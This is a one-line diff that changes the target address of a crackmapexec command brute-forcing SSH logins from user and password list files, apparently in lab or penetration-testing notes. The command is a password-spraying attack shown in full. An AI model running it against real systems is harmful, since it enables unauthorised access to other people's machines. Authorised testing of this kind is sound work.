@@ -1,1 +1,1 @@
-sudo crackmapexec ssh 192.168.204.132 -u users.lst -p password.lst --continue-on-success | grep '+'
+sudo crackmapexec ssh 10.10.10.16 -u users.lst -p password.lst --continue-on-success | grep '+'
